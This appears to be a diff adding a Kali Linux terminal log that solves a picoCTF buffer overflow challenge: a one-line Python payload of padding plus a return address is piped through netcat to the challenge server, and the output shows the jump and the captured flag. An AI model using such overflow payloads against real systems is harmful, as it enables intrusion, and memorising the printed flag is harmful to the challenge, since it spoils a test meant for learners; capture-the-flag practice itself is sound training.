@@ -1,0 +1,5 @@
+┌──(kali㉿kali)-[~/parcial3]
+└─$ (python3 -c "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08')";echo) | nc saturn.picoctf.net 64185
+Please enter your string: 
+Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
+picoCTF{addr3ss3s_ar3_3asy_b15b081e}
